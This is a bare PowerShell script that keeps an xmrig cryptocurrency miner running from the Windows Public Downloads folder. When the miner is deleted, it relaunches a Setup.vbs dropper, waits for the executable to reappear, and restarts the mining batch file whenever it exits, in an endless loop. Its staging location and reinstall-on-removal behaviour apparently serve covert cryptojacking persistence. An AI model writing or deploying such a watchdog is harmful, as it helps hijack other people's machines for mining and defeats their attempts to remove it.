$xmrigPath = "C:\Users\Public\Downloads\xmrig-6.22.2\xmrig.exe"
$setupPath = "C:\Users\Public\Downloads\Setup.vbs"
$coinRunPath = "C:\Users\Public\Downloads\xmrig-6.22.2\COINRUN.cmd"

function Start-CoinRun {
    $global:coinRunProcess = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$coinRunPath`"" -PassThru
    Write-Host "coinrun.cmd START"
}

if (Test-Path $xmrigPath) {
    Start-CoinRun
} else {
    Write-Warning "xmrig.exe DoseNotExist..."
    if (Test-Path $setupPath) {
        Start-Process -FilePath "wscript.exe" -ArgumentList "`"$setupPath`""
        Write-Host "Running Setup.vbs"

        while (!(Test-Path $xmrigPath)) {
            Write-Host "Wait xmrig.exe..."
            Start-Sleep -Seconds 3
        }

        Write-Host "xmrig.exe. RUN coinrun.cmd"
        Start-CoinRun
    } else {
        Write-Error "NO Setup.vbs"
    }
}

while ($true) {
    if (!(Test-Path $xmrigPath)) {
        Write-Warning "xmrig.exe Del. Wait..."

        if (Test-Path $setupPath) {
            Start-Process -FilePath "wscript.exe" -ArgumentList "`"$setupPath`""
            Write-Host "Run Setup.vbs!"

            while (!(Test-Path $xmrigPath)) {
                Write-Host "Wait.. xmrig.exe"
                Start-Sleep -Seconds 3
            }

            Write-Host "START coinrun.cmd"
            Start-CoinRun
        } else {
            Write-Error "NO Setup.vbs: $setupPath"
        }
    }
    if ($global:coinRunProcess -and $global:coinRunProcess.HasExited) {
        Write-Warning "coinrun.cmd STOP. Reboot..."
        Start-CoinRun
    } elseif ($global:coinRunProcess) {
        Write-Host "coinrun.cmd running..."
    }
    Start-Sleep -Seconds 3
}
